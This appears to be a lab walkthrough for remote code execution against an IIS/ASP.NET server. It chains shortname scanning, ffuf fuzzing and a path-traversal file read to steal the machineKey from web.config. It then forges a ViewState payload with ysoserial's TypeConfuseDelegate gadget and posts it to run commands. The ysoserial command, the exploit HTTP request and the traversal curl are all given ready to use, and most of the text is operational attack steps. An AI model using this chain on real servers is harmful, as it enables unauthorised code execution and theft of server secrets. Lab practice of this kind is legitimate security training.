## IIS ViewState RCE - Attack Walkthrough

### Step 1: Discover Files with Shortscan

Run shortscan against the target to find exposed files and shortnames:

```bash
shortscan http://iis.lab/main/
```

Shortscan will return two things:
- **Full filenames** — visit these in your browser or curl them
- **Shortnames** — these are Windows short filenames that can reveal hidden files

Take note of any interesting findings. 

---

### Step 2: Generate a Wordlist from Shortnames

Use `ggnsw` (Generate Generic Normal Shortname Wordlist) to expand shortnames into full potential filenames.

Install ggsnw from here: https://github.com/yazdanctx/ggsnw

This creates a wordlist of possible full filenames based on the shortnames discovered by shortscan. Shortnames only show the first 6 characters + extension, so `ggnsw` helps guess the rest.

---

### Step 3: Fuzz with FFUF

Use the generated wordlist to fuzz the web server and discover hidden endpoints:

```bash
ffuf -u http://iis.lab/main/FUZZ -w wordlist.txt
```


**Goal:** Find and access `web.config` to extract the machine keys.

---

### Step 4: Extract Keys from web.config

Once you have `web.config`, locate these values:

```xml
<machineKey
  validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E868FEA8B4F7D8C8F8F8F8F8F8F8F"
  decryptionKey="ABCD1234567890ABCD1234567890ABCD"
  validation="SHA1"
  decryption="AES" />
```

You need:
- **validationKey** — used to sign the ViewState
- **decryptionKey** — used to encrypt/decrypt the ViewState
- **validation** — the hashing algorithm (SHA1)
- **decryption** — the encryption algorithm (AES)

---

### Step 5: Get the Generator Key

The generator (VIEWSTATEGENERATOR) is a page-specific identifier. Get it from the HTML source of the target page:

---

### Step 6: Generate the Malicious Payload

Use ysoserial to craft a ViewState payload that executes a command:

```powershell
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=<KEY> —decryptionkey=<KEY> --validationalg="SHA1" --decryptionalg="AES" --generator=<KEY> --path="/main/home.aspx" --apppath="/main/"
```

**Parameters explained:**
| Parameter | Value | Source |
|-----------|-------|--------|
| `-p ViewState` | Plugin type | Always ViewState for this attack |
| `-g TypeConfuseDelegate` | Gadget type | The deserialization gadget |
| `-c` | Command to execute | Whatever you want to run |
| `--validationkey` | From web.config | Signs the payload |
| `--decryptionkey` | From web.config | Encrypts the payload |
| `--validationalg` | From web.config | SHA1, SHA256, etc. |
| `--decryptionalg` | From web.config | AES, 3DES, etc. |
| `--generator` | From HTML source | Page-specific identifier |
| `--path` | `/main/home.aspx` | Full path to the target page |
| `--apppath` | `/main/` | Application root path |

---

### Step 7: Deliver the Payload

Intercept a POST request to `http://iis.lab/main/home.aspx` (using Burp Suite, curl, or browser dev tools).

Insert the generated payload into the `__VIEWSTATE` parameter:

```http
POST /main/home.aspx HTTP/1.1
Host: iis.lab
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=<PAYLOAD_HERE>&__VIEWSTATEGENERATOR=CA0B0334&Button1=Refresh+Session
```

Send the request. The server will deserialize your malicious ViewState and execute your command.

---

### Step 8: Verify Execution

Check if your command ran successfully using the LFI to read the output file:

```bash
curl "http://iis.lab/main/download.aspx?file=../../../../Windows/Temp/pwned.txt"
```

Or if you have shell access:

```powershell
type C:\Windows\Temp\pwned.txt
```
---

ASP.NET uses ViewState to remember page data between requests. It's stored in a hidden field called __VIEWSTATE, which is signed with a validationKey and optionally encrypted with a decryptionKey to prevent tampering.

When these keys are hardcoded in web.config instead of auto-generated, an attacker who reads them can use ysoserial to craft a malicious ViewState — they sign and encrypt it with the stolen keys, so the server trusts it as legitimate. When ASP.NET deserializes this malicious ViewState, the TypeConfuseDelegate gadget tricks the runtime into executing arbitrary commands instead of restoring page state.

The chain: Static keys → Forge valid ViewState → Server deserializes → Code execution.

---

**Quick Reference Card:**
```
1. shortscan → Find files + shortnames
2. ggnsw     → Expand shortnames to wordlist
3. ffuf      → Fuzz for hidden endpoints
4. LFI       → Read web.config via download.aspx?file=../../web.config
5. curl      → Get __VIEWSTATEGENERATOR from page source
6. ysoserial → Generate payload with stolen keys
7. POST      → Deliver payload in __VIEWSTATE parameter
8. Verify    → Check command output
```
